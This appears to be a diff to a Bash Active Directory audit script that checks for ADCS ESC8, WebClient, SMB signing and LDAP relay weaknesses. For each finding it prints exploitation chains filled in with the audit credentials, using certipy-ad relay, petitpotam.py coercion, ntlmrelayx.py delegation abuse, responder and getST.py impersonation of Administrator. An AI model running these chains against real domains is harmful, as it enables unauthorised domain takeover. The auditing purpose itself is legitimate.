@@ -235,28 +235,6 @@ else
   DC_COUNT=0
 fi
 
-# Scan scope for relay targets
-SUBNET=$(echo "$DC_IP" | cut -d'.' -f1-3)
-> "$OUTPUT_DIR/relay_targets_raw.txt"
-for target in "${SCAN_TARGETS[@]}"; do
-  nxc smb "$target" -u "$AD_USER" -p "$PASSWORD" --gen-relay-list "$OUTPUT_DIR/relay_raw_tmp.txt" &>/dev/null
-  [ -f "$OUTPUT_DIR/relay_raw_tmp.txt" ] && cat "$OUTPUT_DIR/relay_raw_tmp.txt" >> "$OUTPUT_DIR/relay_targets_raw.txt"
-  rm -f "$OUTPUT_DIR/relay_raw_tmp.txt"
-done
-
-# Filter out DC IPs from relay targets using all_dcs.txt
-DC_IPS=$(awk -F: '{print $2}' "$OUTPUT_DIR/all_dcs.txt" 2>/dev/null)
-if [ -f "$OUTPUT_DIR/relay_targets_raw.txt" ]; then
-  > "$OUTPUT_DIR/relay_targets.txt"
-  while IFS= read -r ip; do
-    if ! echo "$DC_IPS" | grep -q "^$ip$"; then
-      echo "$ip" >> "$OUTPUT_DIR/relay_targets.txt"
-    fi
-  done < "$OUTPUT_DIR/relay_targets_raw.txt"
-  rm "$OUTPUT_DIR/relay_targets_raw.txt"
-fi
-RELAY_COUNT=$([ -f "$OUTPUT_DIR/relay_targets.txt" ] && wc -l < "$OUTPUT_DIR/relay_targets.txt" || echo 0)
-
 echo ""
 
 # CA on DC check
@@ -312,6 +290,7 @@ if [ ! -z "$CERTIPY_CMD" ]; then
 fi
 
 # ADCS/PKI Vulnerabilities
+ESC8_VULN=0
 if [ ! -z "$CERTIPY_CMD" ]; then
   cd "$OUTPUT_DIR"
   $CERTIPY_CMD find -u "$AD_USER" -p "$PASSWORD" -dc-ip $DC_IP -timeout 5 &>/dev/null
@@ -335,7 +314,6 @@ if [ ! -z "$CERTIPY_CMD" ]; then
     
     if [ ! -z "$VULNS" ]; then
       echo -e "${RED}[KO] ADCS vulnerabilities found → *_Certipy.txt${NC}"
-      
       declare -A GROUPED
       while IFS='|' read -r name esc; do
         if [ -z "${GROUPED[$name]}" ]; then
@@ -344,31 +322,30 @@ if [ ! -z "$CERTIPY_CMD" ]; then
           GROUPED[$name]="${GROUPED[$name]}, $esc"
         fi
       done <<< "$VULNS"
-      
       for name in "${!GROUPED[@]}"; do
         echo -e "${RED}       └─ $name: ${GROUPED[$name]}${NC}"
         
         # ESC8 Exploitation Commands
         if [[ "${GROUPED[$name]}" =~ ESC8 ]]; then
-          CA_HOST=$(echo "$name" | sed 's/CA://')
+          ESC8_CA_HOST=$(echo "$name" | sed 's/CA://')
           
           # Extract DNS Name from Certipy output
-          CA_DNS=$(awk -v ca="$CA_HOST" '
+          ESC8_CA_DNS=$(awk -v ca="$ESC8_CA_HOST" '
             /CA Name\s*:/ { if ($NF == ca) found=1 }
             found && /DNS Name\s*:/ { print $NF; exit }
           ' "$CERTIPY_TXT")
           
           # Fallback to CA_HOST.DOMAIN if no DNS Name found
-          if [ -z "$CA_DNS" ]; then
-            CA_FQDN="${CA_HOST}.${DOMAIN}"
+          if [ -z "$ESC8_CA_DNS" ]; then
+            ESC8_CA_FQDN="${ESC8_CA_HOST}.${DOMAIN}"
           else
-            CA_FQDN="$CA_DNS"
+            ESC8_CA_FQDN="$ESC8_CA_DNS"
           fi
           
-          CA_IP=$(dig +short "$CA_FQDN" @$DC_IP 2>/dev/null | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' | head -1)
+          ESC8_CA_IP=$(dig +short "$ESC8_CA_FQDN" @$DC_IP 2>/dev/null | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' | head -1)
           
           # Extract templates suitable for Domain Controllers
-          DC_TEMPLATES=$(awk '
+          ESC8_DC_TEMPLATES=$(awk '
             /Template Name\s*:/ { 
               template=$NF; 
               client_auth=0; 
@@ -388,34 +365,28 @@ if [ ! -z "$CERTIPY_CMD" ]; then
             }
           ' "$CERTIPY_TXT" | tr '\n' ', ' | sed 's/,$//')
           
-          if [ ! -z "$CA_IP" ] && [ ! -z "$DC_TEMPLATES" ]; then
-            FIRST_DC_TEMPLATE=$(echo "$DC_TEMPLATES" | cut -d',' -f1)
-            echo -e "${GREY}       └─ ESC8 - DC Templates: ${DC_TEMPLATES}${NC}"
+          if [ ! -z "$ESC8_CA_IP" ] && [ ! -z "$ESC8_DC_TEMPLATES" ]; then
+            ESC8_FIRST_DC_TEMPLATE=$(echo "$ESC8_DC_TEMPLATES" | cut -d',' -f1)
+            echo -e "${GREY}       └─ ESC8 - DC Templates: ${ESC8_DC_TEMPLATES}${NC}"
 
             # ESC8 reachability + WebClient cross-reference
-            CA_HTTP_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "http://$CA_IP/certsrv/" 2>/dev/null)
-            CA_NTLM_HEADER=$(curl -sk -D - --max-time 5 "http://$CA_IP/certsrv/" 2>/dev/null | grep -i "WWW-Authenticate")
+            ESC8_CA_HTTP_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "http://$ESC8_CA_IP/certsrv/" 2>/dev/null)
+            ESC8_CA_NTLM_HEADER=$(curl -sk -D - --max-time 5 "http://$ESC8_CA_IP/certsrv/" 2>/dev/null | grep -i "WWW-Authenticate")
 
-            if [ "$CA_HTTP_CODE" != "000" ] && [ ! -z "$CA_HTTP_CODE" ]; then
-              if echo "$CA_NTLM_HEADER" | grep -qi "NTLM\|Negotiate"; then
+            if [ "$ESC8_CA_HTTP_CODE" != "000" ] && [ ! -z "$ESC8_CA_HTTP_CODE" ]; then
+              if echo "$ESC8_CA_NTLM_HEADER" | grep -qi "NTLM\|Negotiate"; then
                 echo -e "${RED}       └─ /certsrv/ reachable + NTLM confirmed — directly exploitable${NC}"
               else
-                echo -e "${GREY}       └─ /certsrv/ reachable (HTTP $CA_HTTP_CODE) but no NTLM header${NC}"
+                echo -e "${GREY}       └─ /certsrv/ reachable (HTTP $ESC8_CA_HTTP_CODE) but no NTLM header${NC}"
               fi
             else
               echo -e "${GREY}       └─ /certsrv/ not reachable from this host — pivot may be required${NC}"
             fi
-
-            if [ ! -z "$WEBCLIENT_HOSTS" ]; then
-              echo -e "${RED}       └─ WebClient hosts present — HTTP coercion → ESC8 chain viable${NC}"
-              echo "$WEBCLIENT_HOSTS" | while read -r wc_host; do
-                echo -e "${GREY}          $wc_host → relay to http://$CA_IP/certsrv/${NC}"
-              done
-            fi
-
-            echo -e "${GREY}          1) certipy-ad relay -target https://${CA_IP}/certsrv/certfnsh.asp -ca ${CA_HOST%%.*} -template ${FIRST_DC_TEMPLATE}${NC}"
+            
+            echo -e "${GREY}          1) certipy-ad relay -target https://${ESC8_CA_IP}/certsrv/certfnsh.asp -ca ${ESC8_CA_HOST%%.*} -template ${ESC8_FIRST_DC_TEMPLATE}${NC}"
             echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <RELAY_IP> $DC_IP${NC}"
             echo -e "${GREY}          3) certipy-ad auth -pfx <output>.pfx -dc-ip ${DC_IP}${NC}"
+            ESC8_VULN=1
           fi
         fi
       done
@@ -574,6 +545,25 @@ else
   echo -e "${GREEN}[OK] No coerce methods available on DC${NC}"
 fi
 
+# Create Relay List and filter DC IPs from relay targets
+> "$OUTPUT_DIR/relay_targets_raw.txt"
+for target in "${SCAN_TARGETS[@]}"; do
+  nxc smb "$target" -u "$AD_USER" -p "$PASSWORD" --gen-relay-list "$OUTPUT_DIR/relay_raw_tmp.txt" &>/dev/null
+  [ -f "$OUTPUT_DIR/relay_raw_tmp.txt" ] && cat "$OUTPUT_DIR/relay_raw_tmp.txt" >> "$OUTPUT_DIR/relay_targets_raw.txt"
+  rm -f "$OUTPUT_DIR/relay_raw_tmp.txt"
+done
+DC_IPS=$(awk -F: '{print $2}' "$OUTPUT_DIR/all_dcs.txt" 2>/dev/null)
+if [ -f "$OUTPUT_DIR/relay_targets_raw.txt" ]; then
+  > "$OUTPUT_DIR/relay_targets.txt"
+  while IFS= read -r ip; do
+    if ! echo "$DC_IPS" | grep -q "^$ip$"; then
+      echo "$ip" >> "$OUTPUT_DIR/relay_targets.txt"
+    fi
+  done < "$OUTPUT_DIR/relay_targets_raw.txt"
+  rm "$OUTPUT_DIR/relay_targets_raw.txt"
+fi
+RELAY_COUNT=$([ -f "$OUTPUT_DIR/relay_targets.txt" ] && wc -l < "$OUTPUT_DIR/relay_targets.txt" || echo 0)
+
 # Authentication Coercion & Poisoning - WPAD
 WPAD_DNS=$(nslookup wpad.$DOMAIN $DC_IP 2>&1)
 if echo "$WPAD_DNS" | grep -q "can't find"; then
@@ -592,7 +582,6 @@ else
   echo -e "${GREEN}[OK] IPv6 DNS configured for DC (no DHCPv6 Poisoning)${NC}"
   IPV6_VULN=0
 fi
-
 
 # Authentication Coercion & Poisoning - ADIDNS Poisoning
 ADIDNS_OUTPUT=$(dacledit.py -action read -target-dn "DC=$DOMAIN,CN=MicrosoftDNS,DC=DomainDnsZones,$DOMAIN_DN" -dc-ip $DC_IP "$FULL_USER:$PASSWORD" 2>/dev/null)
@@ -630,6 +619,13 @@ if [ "$WEBCLIENT_COUNT" -gt 0 ]; then
     echo -e "${GREY}          1) ntlmrelayx.py -t ldap://$DC_IP --delegate-access --no-smb-server --http-port 80${NC}"
     echo -e "${GREY}          2) responder -I <IF> --lm (or printerbug via HTTP: //$host@<RELAY>/x)${NC}"
   done
+  if [ "$ESC8_VULN" -eq 1 ]; then
+  echo -e "${RED}       └─ WebClient hosts present — HTTP coercion → ESC8 chain viable${NC}"
+  echo "$WEBCLIENT_HOSTS" | while read -r wc_host; do
+    echo -e "${GREY}          $wc_host → relay to http://$ESC8_CA_IP/certsrv/${NC}"
+    echo -e "${GREY}          certipy-ad relay -target https://$ESC8_CA_IP/certsrv/certfnsh.asp -ca ${ESC8_CA_HOST%%.*} -template $ESC8_FIRST_DC_TEMPLATE${NC}"
+  done
+fi
 else
   echo -e "${GREEN}[OK] No hosts with WebClient (WebDAV) running${NC}"
 fi
@@ -657,7 +653,7 @@ else
   echo -e "${GREEN}[OK] SMBv1 disabled on scanned hosts${NC}"
 fi
 
-# NTLMv2 - SMB Signing on DCs
+# SMB Signing on DCs
 if [ -f "$OUTPUT_DIR/all_dcs.txt" ] && [ $DC_COUNT -gt 1 ]; then
   VULN_SMB_DCS=""
   VULN_SMB_COUNT=0  
@@ -758,6 +754,10 @@ if [ -f "$OUTPUT_DIR/all_dcs.txt" ] && [ $DC_COUNT -gt 1 ]; then
       echo -e "${GREY}       └─ 1) ntlmrelayx.py -t ldap://${FIRST_VULN_LDAP_DC_IP} --remove-mic --delegate-access${NC}"
       echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <RELAY_IP> ${FIRST_VULN_LDAP_DC_IP}${NC}"
       echo -e "${GREY}          3) getST.py -spn cifs/${FIRST_VULN_LDAP_DC_IP} '$DOMAIN'/\$MACHINE\$ -impersonate Administrator${NC}"
+    elif [ "$WEBCLIENT_COUNT" -gt 0 ]; then
+      echo -e "${RED}       └─ Exploitable via WebClient → LDAP Relay${NC}"
+      echo -e "${GREY}          1) ntlmrelayx.py -t ldap://$DC_IP --delegate-access --no-smb-server --http-port 80${NC}"
+      echo -e "${GREY}          2) responder -I <IF> + printerbug via http://<WEBCLIENT_HOST>@<RELAY>/x${NC}"
     else
       echo -e "${GREEN}       └─ Not exploitable: No relay targets without SMB Signing found${NC}"
     fi
@@ -920,16 +920,16 @@ if command -v bloodhound-python &>/dev/null || command -v bloodhound.py &>/dev/n
   BH_CMD=$(command -v bloodhound-python 2>/dev/null || command -v bloodhound.py 2>/dev/null)
   cd "$OUTPUT_DIR/bloodhound"
   $BH_CMD -u "$AD_USER" -p "$PASSWORD" -d "$DOMAIN" -dc "${DC_FQDN}" -ns "$DC_IP" -c $BH_MODE &>/dev/null
+  BH_JSON=$(ls -1 "$OUTPUT_DIR/bloodhound"/*.json 2>/dev/null | grep -v Certipy | wc -l)
   
   # Fallback with DNS TCP if no JSONs produced
-  BH_JSON=$(ls -1 "$OUTPUT_DIR/bloodhound"/*.json 2>/dev/null | grep -v Certipy | wc -l)
   if [ "$BH_JSON" -eq 0 ]; then
     $BH_CMD -u "$AD_USER" -p "$PASSWORD" -d "$DOMAIN" -dc "${DC_FQDN}" -ns "$DC_IP" -c $BH_MODE --dns-timeout 30 --dns-tcp &>/dev/null
   fi
   cd "$CURRENT_PATH"
+  BH_JSON=$(ls -1 "$OUTPUT_DIR/bloodhound"/*.json 2>/dev/null | grep -v Certipy | wc -l)
   
   # Check for BloodHound JSONs
-  BH_JSON=$(ls -1 "$OUTPUT_DIR/bloodhound"/*.json 2>/dev/null | wc -l)
   if [ "$BH_JSON" -gt 0 ]; then
     echo "$AD_USER:password:$PASSWORD" > "$OUTPUT_DIR/bloodhound/owned"
     echo -e "${GREEN}[OK] Bloodhound and owned file complete → ${BH_JSON} JSON file(s)${NC}"
